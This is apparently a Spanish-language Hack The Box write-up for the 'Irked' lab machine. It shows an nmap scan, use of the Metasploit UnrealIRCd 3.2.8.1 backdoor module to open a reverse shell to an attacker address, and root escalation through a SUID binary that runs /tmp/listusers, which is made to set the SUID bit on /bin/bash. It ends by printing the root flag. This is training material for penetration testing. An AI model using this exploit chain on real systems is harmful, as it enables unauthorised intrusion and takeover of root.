---
tags:
title: Irked - Easy (HTB)
permalink: /Irked-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Introduccion

# Reconocimiento

```bash
nmap -sCV -p22,80,111,6697,8067,56881,65534 10.129.255.36                 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-09 12:16 EST
Nmap scan report for 10.129.255.36
Host is up (0.76s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          33317/tcp6  status
|   100024  1          45715/udp6  status
|   100024  1          56544/udp   status
|_  100024  1          56881/tcp   status
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
56881/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd
Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.68 seconds
```

## Website 

La pagina principal muestra el siguiente mensaje, con una imagen

![image-center](/assets/images/Pasted image 20251209141748.png)
## Shell as ircd
Solo lo que me interesa que hablar de IRC, donde además los `demas` puertos muestran que el servicio de `UnrealIRCd` esta corriendo.

> `UnrealIRCd` es un software de servidor IRC ([Internet Relay Chat](https://www.google.com/search?q=Internet+Relay+Chat&client=firefox-b-d&sca_esv=1200947014d1748e&sxsrf=AE3TifPODzokUrrQtTZ6T4p_aUgg0LdhAg%3A1765301419486&ei=q1w4adm2HZrK1sQPgaqiyAg&ved=2ahUKEwjk74m7ibGRAxXqqZUCHRkVMWYQgK4QegQIARAB&uact=5&oq=UnrealIRCd+que+es+&gs_lp=Egxnd3Mtd2l6LXNlcnAiElVucmVhbElSQ2QgcXVlIGVzIDIGEAAYFhgeMggQABiABBiiBDIIEAAYgAQYogQyCBAAGIAEGKIEMggQABiABBiiBEj5DVDEA1jWDHADeACQAQCYAVOgAa8FqgEBObgBA8gBAPgBAvgBAZgCCaAC5QXCAgUQABiABMICCBAAGIAEGMsBwgILEAAYgAQYxwMYywHCAgQQABgewgIFEAAY7wXCAgkQABgWGMcDGB6YAwCIBgGSBwE5oAfMILIHATm4B-UFwgcFMC40LjXIBxyACAA&sclient=gws-wiz-serp&zx=1765302818620&no_sw_cr=1&mstk=AUtExfCseRPeCH0QlA9HxJvc46TEtBkZc4gmGKhPFQcWuceBqqPndcqcQq9VdiJ3J2gWNMFOJV2_E5ZXlzbaquKvcqKkpTylCN7TNYgfujM64Lbs3eiqbYUdoirs3jKVJjJqxZTQdaXxyJn5P5VSYfOYK_v1kw-SKGDgLul2TZ7WiVGR-OQ&csui=3)) de [código abierto](https://www.google.com/search?q=c%C3%B3digo+abierto&client=firefox-b-d&sca_esv=1200947014d1748e&sxsrf=AE3TifPODzokUrrQtTZ6T4p_aUgg0LdhAg%3A1765301419486&ei=q1w4adm2HZrK1sQPgaqiyAg&ved=2ahUKEwjk74m7ibGRAxXqqZUCHRkVMWYQgK4QegQIARAC&uact=5&oq=UnrealIRCd+que+es+&gs_lp=Egxnd3Mtd2l6LXNlcnAiElVucmVhbElSQ2QgcXVlIGVzIDIGEAAYFhgeMggQABiABBiiBDIIEAAYgAQYogQyCBAAGIAEGKIEMggQABiABBiiBEj5DVDEA1jWDHADeACQAQCYAVOgAa8FqgEBObgBA8gBAPgBAvgBAZgCCaAC5QXCAgUQABiABMICCBAAGIAEGMsBwgILEAAYgAQYxwMYywHCAgQQABgewgIFEAAY7wXCAgkQABgWGMcDGB6YAwCIBgGSBwE5oAfMILIHATm4B-UFwgcFMC40LjXIBxyACAA&sclient=gws-wiz-serp&zx=1765302818620&no_sw_cr=1&mstk=AUtExfCseRPeCH0QlA9HxJvc46TEtBkZc4gmGKhPFQcWuceBqqPndcqcQq9VdiJ3J2gWNMFOJV2_E5ZXlzbaquKvcqKkpTylCN7TNYgfujM64Lbs3eiqbYUdoirs3jKVJjJqxZTQdaXxyJn5P5VSYfOYK_v1kw-SKGDgLul2TZ7WiVGR-OQ&csui=3), muy popular y robusto, para sistemas `Unix/Linux` y `Windows`, que permite crear redes de chat en tiempo real, ofreciendo características avanzadas de seguridad y personalización, siendo una base común para muchas redes `IRC` del mundo.

Buscando por exploit para dicho Software encuentro los siguientes:

```bash
searchsploit unrealircd
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)                                                                                               | linux/remote/16922.rb
UnrealIRCd 3.2.8.1 - Local Configuration Stack Overflow                                                                                                    | windows/dos/18011.txt
UnrealIRCd 3.2.8.1 - Remote Downloader/Execute                                                                                                             | linux/remote/13853.pl
UnrealIRCd 3.x - Remote Denial of Service                                                                                                                  | windows/dos/27407.pl
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```
### Exploit

De todos estos me llama la atención el primero que me permite realizar una `Puerta Trasera (Backdoor)` con la cual puedo ejecutar comandos, por lo que use ese modulo en `Metasploit`.

```bash
msfconsole -q
```

Y ahora use los siguientes comandos para la configuración.

```bash

msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOST 10.129.255.36
RHOST => 10.129.255.36
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RPORT 6697
RPORT => 6697
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 10.10.17.19
LHOST => 10.10.17.19
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set LPORT 4444
LPORT => 4444
```

Y ahora corrí el `exploit`, lo que me dio finalmente una shell como el usuario `ircd`.

```bash
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > run
[*] Started reverse TCP double handler on 10.10.17.19:4444 
[*] 10.129.255.36:6697 - Connected to 10.129.255.36:6697...
    :irked.htb NOTICE AUTH :*** Looking up your hostname...
[*] 10.129.255.36:6697 - Sending backdoor command...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo ruLnLtH3xjVyMBl9;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "ruLnLtH3xjVyMBl9\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.10.17.19:4444 -> 10.129.255.36:57970) at 2025-12-09 12:26:56 -0500

whoami
ircd
```

Para `upgradear` la tty use el siguiente comando de `python`.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
ircd@irked:~/Unreal3.2$
```
## Shell as root

Viendo binarios o script con el bit `SUID`, veo uno que no es normal.

```bash
find / -perm -4000 2>/dev/null 
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/sbin/exim4
/usr/sbin/pppd
/usr/bin/chsh
/usr/bin/procmail
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/at
/usr/bin/pkexec
/usr/bin/X
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/viewuser
/sbin/mount.nfs
/bin/su
/bin/mount
/bin/fusermount
/bin/ntfs-3g
/bin/umount
```

Viendo las cadenas legibles veo lo siguiente.

```bash
ircd@irked:~/Unreal3.2$ strings /usr/bin/viewuser
strings /usr/bin/viewuser
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
setuid
puts
system
__cxa_finalize
__libc_start_main
GLIBC_2.0
GLIBC_2.1.3
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
UWVS
[^_]
This application is being devleoped to set and test user permissions
It is still being actively developed
/tmp/listusers
;*2$"
<SNIP>
```

Al parecer al ejecutarse, busca y ejecuta un archivo llamado `listusers` en el directorio `/tmp`, que además cabe destacar que no esta en el directorio.

```bash
ls -la /tmp
total 84
drwxrwxrwt 12 root root  4096 Dec  9 12:53 .
drwxr-xr-x 21 root root  4096 Sep  5  2022 ..
drwxrwxrwt  2 root root  4096 Dec  9 12:15 .font-unix
drwxrwxrwt  2 root root  4096 Dec  9 12:16 .ICE-unix
drwx------  3 root root  4096 Dec  9 12:16 systemd-private-86436cb38d5844398ae06f705394df06-colord.service-EWlt3C
drwx------  3 root root  4096 Dec  9 12:16 systemd-private-86436cb38d5844398ae06f705394df06-cups.service-e1m6G2
drwx------  3 root root  4096 Dec  9 12:16 systemd-private-86436cb38d5844398ae06f705394df06-rtkit-daemon.service-Ab8fl0
drwxrwxrwt  2 root root  4096 Dec  9 12:15 .Test-unix
drwx------  2 root root  4096 Dec  9 12:16 vmware-root
-r--r--r--  1 root root    11 Dec  9 12:16 .X0-lock
drwxrwxrwt  2 root root  4096 Dec  9 12:16 .X11-unix
drwxrwxrwt  2 root root  4096 Dec  9 12:15 .XIM-unix
```
### Script

Por lo que lo puedo crear el archivo con el siguiente contenido en código `bash`.

```bash
#!/bin/bash 
chmod u+s /bin/bash
```

El script `/usr/bin/viewuser` cuando lo ejecute va a buscar y ejecutar el `listusers`, de manera que como tiene el bit `SUID` se ejecuta como root, por lo que interpreta el código dentro del mismo, permitiéndome escalar y convertir mi shell a una como `root`.

Chequeo los permisos de la `bash`.

```bash
ircd@irked:/tmp$ ls -l /bin/bash
ls -l /bin/bash
-rwxr-xr-x 1 root root 1105840 Nov  5  2016 /bin/bash
```

Y ahora ejecuto el binario, y puedo ver q el permiso cambia.
```
ircd@irked:/tmp$ /usr/bin/viewuser
/usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2025-12-09 12:16 (:0)
ircd@irked:/tmp$ ls -l /bin/bash
ls -l /bin/bash
-rwsr-xr-x 1 root root 1105840 Nov  5  2016 /bin/bash
```
### Shell

Por lo que ahora puedo convertirme en el usuario `root` con el siguiente comando.

```bash
ircd@irked:/tmp$ bash -p
bash -p
bash-4.3# whoami
whoami
root
bash-4.3# cat /root/root.txt
cat /root/root.txt
bcea443de8fff8b40e1a5b9dfd509aea
```

`~Happy Hacking.`
